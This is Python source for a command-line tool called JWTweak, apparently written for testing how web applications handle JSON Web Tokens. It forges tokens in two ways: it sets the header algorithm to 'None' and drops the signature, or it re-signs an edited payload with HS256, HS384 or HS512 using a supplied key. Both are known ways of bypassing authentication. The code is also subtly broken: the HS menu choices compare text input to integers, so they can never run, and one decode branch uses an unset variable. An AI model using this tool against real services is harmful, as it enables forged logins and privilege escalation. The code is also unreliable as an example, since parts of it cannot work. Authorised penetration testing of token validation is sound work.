#JWTweak-v1.0
import os
import jwt
import re
import base64
import math
import json

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def jwtWeak():
    """ Automate the progress of changing the algorithm of input JWT Token and then generate the new JWT based on changed algorithm """
    print("Enter the JWT Token:")
    in_jwt = input()

    if re.match(r'^[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*$',in_jwt):
        print(f"{bcolors.OKGREEN}\nThis is a valid input JWT Token{bcolors.ENDC}\n")
        print(f"{bcolors.BOLD}*************************************************MAIN MENU*************************************************")


        choice = input("""
                      1: Detect the algorithm of the input JWT Token
                      2: Base64 decode the input JWT Token
                      3: Generate new JWT Token by changing the algorithm of the input JWT to 'None'
                      4: Generate new JWT Token by changing the algorithm of the input JWT to 'HS256'
                      5: Generate new JWT Token by changing the algorithm of the input JWT to 'HS384'
                      6: Generate new JWT Token by changing the algorithm of the input JWT to 'HS512'
                      7: Quit
                      Please enter your choice: """+f"{bcolors.ENDC}")
        print (f"{bcolors.BOLD}***********************************************************************************************************{bcolors.ENDC}")

#######################################################################################
#Detect the algorithm of the input JWT Token
#######################################################################################
        if choice == '1':
            part_jwt=in_jwt.split('.')
            Header=part_jwt[0]
            if len(Header) % 4 != 0: #check if multiple of 4
                while len(Header) % 4 != 0:
                    Header = Header + "="
                req_str = base64.b64decode(Header)
            else:
                req_str = base64.b64decode(Header)
                str_req_str=req_str.decode('utf-8')
            json_header = json.loads(str_req_str)
            algo=json_header['alg']
            print("\nThe present algorithm of input JWT Token- "+f"{bcolors.OKGREEN}"+f"{bcolors.BOLD}"+ algo+f"{bcolors.UNDERLINE}{bcolors.ENDC}\n")

#######################################################################################
#Base 64 Decode JWT
#######################################################################################
        elif choice == '2':
            part_jwt=in_jwt.split('.')
            Header=part_jwt[0]
            Payload=part_jwt[1]
            Signature=part_jwt[2]
            print(f"{bcolors.WARNING}\nBefore Base64 Decode:{bcolors.ENDC}")
            #base64 encoded Header
            print("\nHeader="+Header)
            #base64 encoded Payload
            print("\nPayload="+Payload)
            #base64 encoded Signature
            print("\nSignature="+Signature)


            print(f"{bcolors.WARNING}\nAfter Base64 Decode:{bcolors.ENDC}")


            if len(Header) % 4 != 0: #check if multiple of 4
                while len(Header) % 4 != 0:
                    Header = Header + "="
                req_str = base64.b64decode(Header)
            else:
                req_str = base64.b64decode(Header)
                req_str=req_str.decode('utf-8')
            #base64 decoded Header
            print("\nHeader="+str(req_str))


            if len(Payload) % 4 != 0: #check if multiple of 4
                while len(Payload) % 4 != 0:
                    Payload = Payload + "="
                req_str = base64.b64decode(Payload)
            else:
                req_str = base64.b64decode(Payload)
            req_str=req_str.decode('utf-8')
            #base64 decoded Payload
            print("\nPayload="+str(req_str))

            Signature=Signature.replace('_','/').replace('-','+')
            if len(Signature) % 4 != 0: #check if multiple of 4
                while len(Signature) % 4 != 0:
                    Signature = Signature + "="
                req_str = base64.b64decode(Signature)
            else:
                req_str = base64.b64decode(Signature)
            #base64 decoded Signature
            print("\nSignature="+str(req_str))

#######################################################################################
#Generate JWT Token with Algorithm type 'None'
#######################################################################################

        elif choice == '3':
            part_jwt=in_jwt.split('.')
            Header=part_jwt[0]
            Payload=part_jwt[1]
            Signature=part_jwt[2]
            print(f"{bcolors.WARNING}\nBefore Algorithm Coversion:{bcolors.ENDC}")
            if len(Header) % 4 != 0: #check if multiple of 4
                while len(Header) % 4 != 0:
                    Header = Header + "="
                req_str = base64.b64decode(Header)
            else:
                req_str = base64.b64decode(Header)
                req_str=req_str.decode('utf-8')
            json_header = json.loads(req_str)
            algo=json_header['alg']
            print("\nThe present algorithm of input JWT Token- "+f"{bcolors.OKGREEN}"+f"{bcolors.BOLD}"+ algo+f"{bcolors.UNDERLINE}{bcolors.ENDC}\n")

            #base64 encoded Header
            print("\nHeader="+Header)
            #base64 encoded Payload
            print("\nPayload="+Payload)
            #base64 encoded Signature
            print("\nSignature="+Signature)

            print(f"{bcolors.WARNING}\nAfter Algorithm Changed to 'None':{bcolors.ENDC}")

            json_header['alg']='None'

            str_json_header=json.dumps(json_header)

            print("\nModified Header(Plain Text)="+str(str_json_header))  
            if len(Payload) % 4 != 0: #check if multiple of 4
                while len(Payload) % 4 != 0:
                    Payload = Payload + "="
                req_str = base64.b64decode(Payload)
            else:
                req_str = base64.b64decode(Payload)
            b64decoded_payload=req_str.decode('utf-8')
            #base64 decoded Payload
            print("\nPayload(Plain Text)="+str(b64decoded_payload))


            print(f"{bcolors.BOLD}\nPlease provide the modified Payload(Json format) [if not, press ENTER]:{bcolors.ENDC}")
            mod_payload=input()
            if re.match(r'(.*?)(?:")',mod_payload):
                print("\nModified payload is:"+mod_payload)
                b64_Header = base64.b64encode(str_json_header.encode("utf-8"))
                b64_encoded_header = str(b64_Header, "utf-8")                
                b64_Payload = base64.b64encode(mod_payload.encode("utf-8"))
                b64_encoded_Payload = str(b64_Payload, "utf-8")
                print("\nThe New JWT Token with Algorithm changed to 'None':\n\n"+f"{bcolors.OKGREEN}"+f"{bcolors.BOLD}"+b64_encoded_header+"."+b64_encoded_Payload+"."+f"{bcolors.OKGREEN}{bcolors.ENDC}")
            elif not mod_payload:
                print(f"{bcolors.OKBLUE}\nThe payload is unchanged{bcolors.ENDC}")
                json_header=str(json_header)
                b64_Header = base64.b64encode(str_json_header.encode("utf-8"))
                b64_encoded_header = str(b64_Header, "utf-8")
                
                b64decoded_payload=str(b64decoded_payload)
                b64_Payload = base64.b64encode(b64decoded_payload.encode("utf-8"))
                b64_encoded_Payload = str(b64_Payload, "utf-8")
                print("\nThe New JWT Token with Algorithm changed to 'None':\n\n"+f"{bcolors.OKGREEN}"+f"{bcolors.BOLD}"+b64_encoded_header+"."+b64_encoded_Payload+"."+f"{bcolors.OKGREEN}{bcolors.ENDC}")
            else:
                print("Not Valid Payload")

#######################################################################################
#Generate JWT Token with Algorithm type 'HS256'
#######################################################################################

        elif choice == 4:
            part_jwt=in_jwt.split('.')
            Header=part_jwt[0]
            Payload=part_jwt[1]
            Signature=part_jwt[2]
            print(f"{bcolors.WARNING}\nBefore Algorithm Coversion:{bcolors.ENDC}")
            if len(Header) % 4 != 0: #check if multiple of 4
                while len(Header) % 4 != 0:
                    Header = Header + "="
                req_str = base64.b64decode(Header)
            else:
                req_str = base64.b64decode(Header)
                req_str=req_str.decode('utf-8')
            b64_decoded_header=req_str
            json_header = json.loads(req_str)
            algo=json_header['alg']
            print("\nThe present algorithm of input JWT Token- "+f"{bcolors.OKGREEN}"+f"{bcolors.BOLD}"+ algo+f"{bcolors.UNDERLINE}{bcolors.ENDC}\n")

            #base64 encoded Header
            print("\nHeader="+Header)
            #base64 encoded Payload
            print("\nPayload="+Payload)
            #base64 encoded Signature
            print("\nSignature="+Signature)

            print(f"{bcolors.WARNING}\nAfter Algorithm Changed to 'HS256':{bcolors.ENDC}")

            json_header['alg']='HS256'
            str_json_header=json.dumps(json_header)
            print("\nModified Header(Plain Text)="+str(str_json_header))
            if len(Payload) % 4 != 0: #check if multiple of 4
                while len(Payload) % 4 != 0:
                    Payload = Payload + "="
                req_str = base64.b64decode(Payload)
            else:
                req_str = base64.b64decode(Payload)
            b64decoded_payload=req_str.decode('utf-8')
            #json_payload=json.loads(b64decoded_payload)
            #base64 decoded Payload
            print("\nPayload(Plain Text)="+str(b64decoded_payload))


            print(f"{bcolors.BOLD}\nPlease provide the modified Payload(Json format) [if not, press ENTER]:{bcolors.ENDC}")
            mod_payload=input()
            if re.match(r'(.*?)(?:")',mod_payload):
                print("\nModified payload is:"+mod_payload)
               # json_mod_payload=
                json_header=str(json_header)
                b64_Header = base64.b64encode(json_header.encode("utf-8"))
                b64_encoded_header = str(b64_Header, "utf-8")
                mod_payload=str(mod_payload)
                b64_Payload = base64.b64encode(mod_payload.encode("utf-8"))
                b64_encoded_Payload = str(b64_Payload, "utf-8")
                json_mod_payload=json.loads(mod_payload)

                print("\nEnter the symmetic key/secret for generating the signature:")
                hs256_key=input()

                encoded_HS256 = jwt.encode(json_mod_payload, hs256_key, algorithm='HS256')
                str_encoded_HS256=encoded_HS256.decode('utf')

                print(f"{bcolors.OKGREEN}\nThe New JWT Token with Algorithm changed to 'HS256':\n"+str(str_encoded_HS256)+f"{bcolors.OKGREEN}{bcolors.ENDC}")

            elif not mod_payload:
                print(f"{bcolors.OKBLUE}\nThe payload is unchanged{bcolors.ENDC}")
                json_header=str(json_header)
                b64_Header = base64.b64encode(json_header.encode("utf-8"))
                b64_encoded_header = str(b64_Header, "utf-8")
                b64decoded_payload=str(b64decoded_payload)
                b64_Payload = base64.b64encode(b64decoded_payload.encode("utf-8"))
                b64_encoded_Payload = str(b64_Payload, "utf-8")
                json_mod_payload=json.loads(b64decoded_payload)

                print("\nEnter the symmetic key/secret for generating the signature:")
                hs256_key=input()

                encoded_HS256 = jwt.encode(json_mod_payload, hs256_key, algorithm='HS256')
                str_encoded_HS256=encoded_HS256.decode('utf')
                print(f"{bcolors.OKGREEN}\nThe New JWT Token with Algorithm changed to 'HS256':\n"+str(str_encoded_HS256)+f"{bcolors.OKGREEN}{bcolors.ENDC}")
            else:
                print("Not Valid Payload")

#######################################################################################
#Generate JWT Token with Algorithm type 'HS384'
#######################################################################################
        elif choice == 5:
            part_jwt=in_jwt.split('.')
            Header=part_jwt[0]
            Payload=part_jwt[1]
            Signature=part_jwt[2]
            print(f"{bcolors.WARNING}\nBefore Algorithm Coversion:{bcolors.ENDC}")
            if len(Header) % 4 != 0: #check if multiple of 4
                while len(Header) % 4 != 0:
                    Header = Header + "="
                req_str = base64.b64decode(Header)
            else:
                req_str = base64.b64decode(Header)
                req_str=req_str.decode('utf-8')
            b64_decoded_header=req_str
            json_header = json.loads(req_str)
            algo=json_header['alg']
            print("\nThe present algorithm of input JWT Token- "+f"{bcolors.OKGREEN}"+f"{bcolors.BOLD}"+ algo+f"{bcolors.UNDERLINE}{bcolors.ENDC}\n")

            #base64 encoded Header
            print("\nHeader="+Header)
            #base64 encoded Payload
            print("\nPayload="+Payload)
            #base64 encoded Signature
            print("\nSignature="+Signature)

            print(f"{bcolors.WARNING}\nAfter Algorithm Changed to 'HS384':{bcolors.ENDC}")

            json_header['alg']='HS384'
            str_json_header=json.dumps(json_header)
            print("\nModified Header(Plain Text)="+str(str_json_header))
            if len(Payload) % 4 != 0: #check if multiple of 4
                while len(Payload) % 4 != 0:
                    Payload = Payload + "="
                req_str = base64.b64decode(Payload)
            else:
                req_str = base64.b64decode(Payload)
            b64decoded_payload=req_str.decode('utf-8')
            #json_payload=json.loads(b64decoded_payload)
            #base64 decoded Payload
            print("\nPayload(Plain Text)="+str(b64decoded_payload))


            print(f"{bcolors.BOLD}\nPlease provide the modified Payload(Json format) [if not, press ENTER]:{bcolors.ENDC}")
            mod_payload=input()
            if re.match(r'(.*?)(?:")',mod_payload):
                print("\nModified payload is:"+mod_payload)
               # json_mod_payload=
                json_header=str(json_header)
                b64_Header = base64.b64encode(json_header.encode("utf-8"))
                b64_encoded_header = str(b64_Header, "utf-8")
                mod_payload=str(mod_payload)
                b64_Payload = base64.b64encode(mod_payload.encode("utf-8"))
                b64_encoded_Payload = str(b64_Payload, "utf-8")
                json_mod_payload=json.loads(mod_payload)

                print("\nEnter the symmetic key/secret for generating the signature:")
                hs256_key=input()

                encoded_HS256 = jwt.encode(json_mod_payload, hs256_key, algorithm='HS384')
                str_encoded_HS256=encoded_HS256.decode('utf')

                print(f"{bcolors.OKGREEN}\nThe New JWT Token with Algorithm changed to 'HS384':\n"+str(str_encoded_HS256)+f"{bcolors.OKGREEN}{bcolors.ENDC}")

            elif not mod_payload:
                print(f"{bcolors.OKBLUE}\nThe payload is unchanged{bcolors.ENDC}")
                json_header=str(json_header)
                b64_Header = base64.b64encode(json_header.encode("utf-8"))
                b64_encoded_header = str(b64_Header, "utf-8")
                b64decoded_payload=str(b64decoded_payload)
                b64_Payload = base64.b64encode(b64decoded_payload.encode("utf-8"))
                b64_encoded_Payload = str(b64_Payload, "utf-8")
                json_mod_payload=json.loads(b64decoded_payload)

                print("\nEnter the symmetic key/secret for generating the signature:")
                hs256_key=input()

                encoded_HS256 = jwt.encode(json_mod_payload, hs256_key, algorithm='HS384')
                str_encoded_HS256=encoded_HS256.decode('utf')
                print(f"{bcolors.OKGREEN}\nThe New JWT Token with Algorithm changed to 'HS384':\n"+str(str_encoded_HS256)+f"{bcolors.OKGREEN}{bcolors.ENDC}")
            else:
                print("Not Valid Payload")

#######################################################################################
#Generate JWT Token with Algorithm type 'HS512'
#######################################################################################
        elif choice== 6:
            part_jwt=in_jwt.split('.')
            Header=part_jwt[0]
            Payload=part_jwt[1]
            Signature=part_jwt[2]
            print(f"{bcolors.WARNING}\nBefore Algorithm Coversion:{bcolors.ENDC}")
            if len(Header) % 4 != 0: #check if multiple of 4
                while len(Header) % 4 != 0:
                    Header = Header + "="
                req_str = base64.b64decode(Header)
            else:
                req_str = base64.b64decode(Header)
                req_str=req_str.decode('utf-8')
            b64_decoded_header=req_str
            json_header = json.loads(req_str)
            algo=json_header['alg']
            print("\nThe present algorithm of input JWT Token- "+f"{bcolors.OKGREEN}"+f"{bcolors.BOLD}"+ algo+f"{bcolors.UNDERLINE}{bcolors.ENDC}\n")

            #base64 encoded Header
            print("\nHeader="+Header)
            #base64 encoded Payload
            print("\nPayload="+Payload)
            #base64 encoded Signature
            print("\nSignature="+Signature)

            print(f"{bcolors.WARNING}\nAfter Algorithm Changed to 'HS512':{bcolors.ENDC}")

            json_header['alg']='HS512'
            str_json_header=json.dumps(json_header)
            print("\nModified Header(Plain Text)="+str(str_json_header))
            if len(Payload) % 4 != 0: #check if multiple of 4
                while len(Payload) % 4 != 0:
                    Payload = Payload + "="
                req_str = base64.b64decode(Payload)
            else:
                req_str = base64.b64decode(Payload)
            b64decoded_payload=req_str.decode('utf-8')
            #json_payload=json.loads(b64decoded_payload)
            #base64 decoded Payload
            print("\nPayload(Plain Text)="+str(b64decoded_payload))


            print(f"{bcolors.BOLD}\nPlease provide the modified Payload(Json format) [if not, press ENTER]:{bcolors.ENDC}")
            mod_payload=input()
            if re.match(r'(.*?)(?:")',mod_payload):
                print("\nModified payload is:"+mod_payload)
               # json_mod_payload=
                json_header=str(json_header)
                b64_Header = base64.b64encode(json_header.encode("utf-8"))
                b64_encoded_header = str(b64_Header, "utf-8")
                mod_payload=str(mod_payload)
                b64_Payload = base64.b64encode(mod_payload.encode("utf-8"))
                b64_encoded_Payload = str(b64_Payload, "utf-8")
                json_mod_payload=json.loads(mod_payload)

                print("\nEnter the symmetic key/secret for generating the signature:")
                hs256_key=input()

                encoded_HS256 = jwt.encode(json_mod_payload, hs256_key, algorithm='HS512')
                str_encoded_HS256=encoded_HS256.decode('utf')

                print(f"{bcolors.OKGREEN}\nThe New JWT Token with Algorithm changed to 'HS512':\n"+str(str_encoded_HS256)+f"{bcolors.OKGREEN}{bcolors.ENDC}")

            elif not mod_payload:
                print(f"{bcolors.OKBLUE}\nThe payload is unchanged{bcolors.ENDC}")
                json_header=str(json_header)
                b64_Header = base64.b64encode(json_header.encode("utf-8"))
                b64_encoded_header = str(b64_Header, "utf-8")
                b64decoded_payload=str(b64decoded_payload)
                b64_Payload = base64.b64encode(b64decoded_payload.encode("utf-8"))
                b64_encoded_Payload = str(b64_Payload, "utf-8")
                json_mod_payload=json.loads(b64decoded_payload)

                print("\nEnter the symmetic key/secret for generating the signature:")
                hs256_key=input()

                encoded_HS256 = jwt.encode(json_mod_payload, hs256_key, algorithm='HS512')
                str_encoded_HS256=encoded_HS256.decode('utf')
                print(f"{bcolors.OKGREEN}\nThe New JWT Token with Algorithm changed to 'HS512':\n"+str(str_encoded_HS256)+f"{bcolors.OKGREEN}{bcolors.ENDC}")
            else:
                print("Not Valid Payload")
        
        elif choice=='7':
            exit()    
        else:
            print("Please select the correct number")
            print("Please try again\n\n")
            jwtWeak()
            exit()

    else:
        print(f"{bcolors.FAIL}\nThis is not a valid input JWT Token{bcolors.ENDC}\n")


if __name__ == '__main__':
    jwtWeak()


 

